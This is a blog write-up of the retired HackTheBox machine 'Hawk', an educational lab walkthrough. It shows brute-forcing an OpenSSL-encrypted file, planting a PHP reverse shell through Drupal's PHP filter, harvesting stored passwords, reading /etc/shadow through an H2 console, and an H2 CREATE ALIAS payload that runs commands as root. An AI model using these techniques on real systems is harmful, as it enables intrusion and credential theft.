---
layout: post
title:  "HackTheBox: Hawk writeup"
date:   2018-12-01 22:00:00 +0100
comments: true
author: BoiteAKlou
categories:
- "Writeup"
- "Pentest"
- "Web"
- "Crypto"
---

Hawk has been retired from HackTheBox active machines so here is my writeup explaining how I rooted this machine.

![Hawk box]({{ "/assets/2018-12-01/hawk-box.png" | absolute_url }} "Hawk Box")

In this article, we will crack a **salted OpenSSL encrypted file**, upload a reverse shell to an instance of **Drupal 7 CMS**. Then, we will use a **SSH port-forwarding** trick to access a **H2 database console** disallowing remote connections and exploit this app to get root on the machine. Enjoy your reading!
 <!--excerpt-->

## Table of Contents
{:.no_toc}

* TOC
{:toc}


## Initial Foothold And User Access

### Recon

As with every machine, we only know its **IP address** so we have to start with **the reconnaissance phase**. `nmap` is always a weapon of choice for this.

Let's start with **a basic scan using default scripts** (-sC option). We will run a deeper scan if nothing is found.

```bash
$ nmap -sC -sV -vvv -oA nmap/Hawk 10.10.10.102
[...]
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBj1TNZ7AO3WSpSMz0UoHlGmWQRlvXcyMXMRhDJ8X+9kZZGKkdXxWcDAu/OvUXdwCKVY+YjPPY8wi+jqKIQXlgICA3MEcg3RlLoHPTUh6KFmPxlT7Heaca7xSJ+BnhFxYF+bhhiaHgcaK8qlZFc9qS2Un3oNS6VDAAHOx2p4FU8OVM/yuik9qt6nxAQVS/v3mZfpVUm3HKOOcfXzyZEZAwrAWHk+2Y2yCBUUY1AmCMed566BfmeEOYXJU18I92fsSOhuzTt7tqX4u66SO1cyLTJczSA7gF42K8O+VPyn3pWnLmMBnAcZS0KbMUKVPa3UBSScxl5nLlSFRyJ1rCBxs7
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM0hCdwqpZ6zvQpLiZ5/tsUDQeVMEXicRx6H8AOW8lyzsHJrrQWgqM1vo5jKUn+bMazqzZ1SbP8QJ3JDS2/SlHs=
|   256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3kNN27mM1080x8c4aOWptSRg6yN21uBMSQiKk1PrsP
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    syn-ack H2 database http console
|_http-favicon: Unknown favicon MD5: 8EAA69F8468C7E0D3DFEF67D5944FF4D
| http-methods:
|_  Supported Methods: GET POST
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Very interesting results! We have an **FTP server allowing anonymous login**, an **SSH server**, an **Apache web server** running **Drupal 7 CMS** and a **H2 database console**. Let's dig into all of this!

### FTP Anonymous Login

We can connect to the ftp server using the name *anonymous* without password. While exploring the only available directory, we have found a hidden file named *.drupal.txt.enc*, that we have downloaded.

```bash
$ ftp 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:boiteaklou): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
226 Directory send OK.
ftp> cd messages
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
226 Directory send OK.
ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
226 Transfer complete.
240 bytes received in 0.00 secs (2.3842 MB/s)
```

### Salted OpenSSL Decryption

As its suffix suggests it, this file is **encrypted**. We can verify that using the `file` program.

```bash
$ file .drupal.txt.enc
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
```

It is also **base64 encoded** so we decode it using the following command:

```bash
$ cat .drupal.txt.enc | base64 -d > drupal.txt.enc
```

After a bit of research, I found a tool on [github](https://github.com/glv2/bruteforce-salted-openssl) called *bruteforce-salted-openssl* which revealed itself very effective.
I used it with the classical *rockyou.txt* wordlist:

```bash
$ bruteforce-salted-openssl -t 8 -f rockyou.txt -v 30 -d SHA256 drupal.txt.enc
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 29
Tried passwords per second: inf
Last tried password: 1234567890

Password candidate: friends
```

<span style="color:Green">Perfect! We have the password.</span> We can now use **OpenSSL** to decipher the file:

```bash
$ openssl enc -d -aes-256-cbc -pass pass:friends -in drupal.txt.enc
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

It looks like we've found credentials for a certain portal.


### Drupal Reverse Shell Upload

Drupal is an Open-Source Content Management System.

Browsing to [http://10.10.10.102:80](http://10.10.10.102:80), we are facing a login page.

![Drupal login]({{ "/assets/2018-12-01/drupal-login.png" | absolute_url }} "Drupal login")

Trying a couple common usernames, we quickly found out that **"admin"** was the right one to combine with the password we just deciphered.

Once logged in, all we have to do is to <span style="color:Red">enable phpfilters</span> and to <span style="color:Red">create a new article with our php reverse shell payload inside.</span> I'll detail all these steps right below.

First of all, we have to <span style="color:DarkOrchid">setup a local listener</span> for our reverse shell:
```bash
$ nc -lvnp 9999
listening on [any] 9999 ...
```

Now, we have to <span style="color:Red">enable phpfilters in order to be able to execute PHP code inside articles.</span> Once logged in as admin, go to **Configuration > Content Authoring > Text formats** and tick **"PHP Evaluator"**.

![Drupal phpfilter]({{ "/assets/2018-12-01/drupal-phpfilter.png" | absolute_url }} "Drupal phpfilter")


Then, we can add a new article and place our **PHP reverse shell payload** inside.

![Drupal add article]({{ "/assets/2018-12-01/drupal-add-article.png" | absolute_url }} "Drupal add article")

Also, don't forget to <span style="color:Red">set the text format of the article to "PHP Code"</span> at the bottom the page:

![Drupal textformat]({{ "/assets/2018-12-01/drupal-textformat.png" | absolute_url }} "Drupal text-format")

The reverse shell should be coming back to our machine now:
```bash
$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.102] 38992
/bin/sh: 0: can t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Very nice! Being connected as **www-data** is not enough for the user flag unfortunately. <span style="color:MediumSlateBlue">We must find a way to connect as a real user!</span>

### Stored credentials retrieval

First, let's <span style="color:Green">upgrade this horrible shell to a bash</span>:
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@hawk:/var/www/html$
```

After a bit of digging, I found what seems to be **a plaintext password**:

```bash
www-data@hawk:/var/www/html$ grep -Ri password
[...]
sites/default/settings.php:      'password' => 'drupal4hawk',
[...]
```

Having a look at */home/*, we can see that *daniel* is our potential target. Let's see if we can `su` as *daniel* with this password:
```bash
www-data@hawk:/var/www/html$ su daniel
su daniel
Password: drupal4hawk

Python 3.6.5 (default, Apr  1 2018, 05:46:30)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```
It's working but <span style="color:Red">we're popping inside a python shell!</span> Surprising, even though it shouldn't be too difficult to escape.

### Python Shell Escape

Actually, we can use the same technique we used to upgrade from **/bin/sh** to **/bin/bash**:

```bash
Python 3.6.5 (default, Apr  1 2018, 05:46:30)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty
import pty
>>> pty.spawn('/bin/bash')
pty.spawn('/bin/bash')
daniel@hawk:/var/www/html$
```
Nothing prevents us to get the user flag anymore!

```bash
daniel@hawk:/var/www/html$ cat /home/daniel/user.txt
cat /home/daniel/user.txt
[REDACTED]
```

>As we've seen during our recon, an SSH server is running and we can use to directly login as daniel. A nice checkpoint allowed by the author of the box :wink:.


## Elevating privileges

We are now connected as *daniel* via **SSH**. We can start the **enumeration process**.

### Enumeration

When looking for a way to escalate privileges on machine, I like to run a tool like [LinEnum.sh](https://github.com/rebootuser/LinEnum) in the background while I fuzz the machine manually.

Do you remember the **H2 Database console** we saw with the `nmap` scan? <span style="color:Red">It is running as root on Hawk...</span>

```bash
daniel@hawk:~$ ps -aux |grep h2
root        801  0.0  0.0   4628   808 ?        Ss   Nov30   0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
root        802  0.0  5.7 2345696 56448 ?       Sl   Nov30   1:28 /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
daniel    21347  0.0  0.1  13136  1012 pts/2    S+   18:57   0:00 grep h2
```

Are you thinking what I am thinking?

When trying to access it in a web browser, it says: <span style="color:Maroon">*"Sorry, remote connections ('webAllowOthers') are disabled on this server."*</span> :cry:


### SSH Port Forwarding

Now that we have a foot in the system, we can <span style="color:Green">initiate connections from the machine itself</span>. Let's verify this:

```bash
daniel@hawk:~$ curl http://127.0.0.1:8082
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!--
Copyright 2004-2014 H2 Group. Multiple-Licensed under the MPL 2.0,
and the EPL 1.0 (http://h2database.com/html/license.html).
Initial Developer: H2 Group
-->
<html><head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <title>H2 Console</title>
    <link rel="stylesheet" type="text/css" href="stylesheet.css" />
<script type="text/javascript">
location.href = 'login.jsp?jsessionid=c48d2804eb930787aff2325b9aba37dd';
</script>
</head>
<body style="margin: 20px;">

<h1>Welcome to H2</h1>
<h2>No Javascript</h2>
If you are not automatically redirected to the login page, then
Javascript is currently disabled or your browser does not support Javascript.
For this application to work, Javascript is essential.
Please enable Javascript now, or use another web browser that supports it.

</body></html>
```

<span style="color:Green">Seems allowed when executed from the localhost!</span> However, we don't have access to a web browser on Hawk. This is why we need to use SSH port forwarding as follows: `ssh -L 9000:localhost:8082 daniel@10.10.10.102`

The english version is: "**Forward** everything I send to port **127.0.0.1:9000** to **10.10.102:8082**".

<span style="color:Red">Now, we should be able to access the H2 database console from our own web browser.</span>


### H2 Database Console

![H2 Database]({{ "/assets/2018-12-01/h2-db.png" | absolute_url }} "H2 database")

When trying to connect to the **default database** with **default credentials**, it returns an error. <span style="color:Green">But what if we try to connect to a new database?</span>

![H2 New db]({{ "/assets/2018-12-01/h2-boiteaklou.png" | absolute_url }} "H2 New db")

I changed the **database URL** to a non-existing database and the connection test returns <span style="color:Red">"Success"</span>. Now, <span style="color:Green">I can connect to this new database</span>. From there, I can **execute H2 functions** like `FILE_READ('/etc/shadow',NULL)` for instance.

![H2 File read]({{ "/assets/2018-12-01/h2-fileread.png" | absolute_url }} "H2 File read")

Replace **/etc/shadow** by **/root/root.txt** and you'll <span style="color:Green">get the root flag!</span> :checkered_flag:

Ok we can read protected files, but <span style="color:Red">can we get a root shell?</span>

### Getting a Root Shell

Still connected to our *boiteaklou database*, we can **create an alias** with the following command:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
```

Then, <span style="color:Green">we can trigger the code execution</span> by **calling this alias** and specifying our command as an argument:

![H2 RCE]({{ "/assets/2018-12-01/h2-rce.png" | absolute_url }} "H2 RCE")

<span style="color:Green">It's kind of a root shell!</span> If you want something more interactive, it can be done easily from what we have and I'm sure you will find a way :wink:

I hope you enjoyed this writeup and see you next time guys!


<p id="signature">BoiteAKlou :hammer:</p>
